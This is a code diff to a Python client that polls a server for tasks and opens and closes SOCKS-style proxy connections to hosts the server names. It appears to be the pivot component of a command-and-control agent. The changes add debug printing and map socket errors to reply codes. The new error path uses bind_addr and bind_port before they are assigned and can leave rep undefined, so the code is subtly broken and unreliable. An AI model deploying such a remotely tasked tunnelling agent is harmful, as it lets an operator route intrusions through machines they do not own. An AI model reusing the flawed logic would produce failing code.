@@ -9,6 +9,7 @@ import socket
 import select
 import time
 import urllib3
+import errno
 
 from collections import namedtuple
 
@@ -91,8 +92,11 @@ def main(url, key):
         try:
             batch_response = []
             for task in batch_request:
+
                 id = task['id']
                 name = task['name']
+                if name != 'check_in':
+                    print(task)
                 parameters = task['parameters']
                 results = ''
                 parameters = [base64_to_string(parameter) for parameter in parameters]
@@ -100,21 +104,30 @@ def main(url, key):
                     if name == 'check_in':
                         check_in_task_id = id
                         continue
+                    if name == 'socks_disconnect':
+                        remote = proxies[int(parameters[0])]
+                        remote.close()
                     if name == 'socks_connect':
                         remote = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                         try:
                             remote.connect((parameters[0], int(parameters[1])))
                             rep = 0
-                        except socket.timeout:
-                            rep = 4
-                        except Exception as e:
-                            print(e)
-                            rep = 1
-
+                        except socket.error as e:
+                            if e.errno == socket.errno.EACCES:
+                                rep = 2
+                            elif e.errno == socket.errno.ENETUNREACH:
+                                rep = 3
+                            elif e.errno == socket.errno.EHOSTUNREACH:
+                                rep = 4
+                            elif e.errno == socket.errno.ECONNREFUSED:
+                                rep = 5
+                        except Exception:
+                            rep = 6
+                                
                         atype = parameters[2]
                        
                         if rep != 0:
-                            results = json.dumps({'remote':'-1','rep':f'{rep}','atype':f'{atype}','bind_addr':'','bind_port':''})
+                            results = json.dumps({'remote':'-1','rep':f'{rep}','atype':f'{atype}','bind_addr':f'{bind_addr}','bind_port':f'{bind_port}'})
                         else:
                             proxies.append(remote)
                             bind_addr = remote.getsockname()[0]
@@ -144,6 +157,8 @@ def main(url, key):
                     #         },
                     #         "id": check_in_task_id
                     #     }])
+                    if name != 'check_in':
+                        print(results)
                     batch_response.extend([{
                         "connectrpc": "0.0.0",
                         "result": string_to_base64(results),
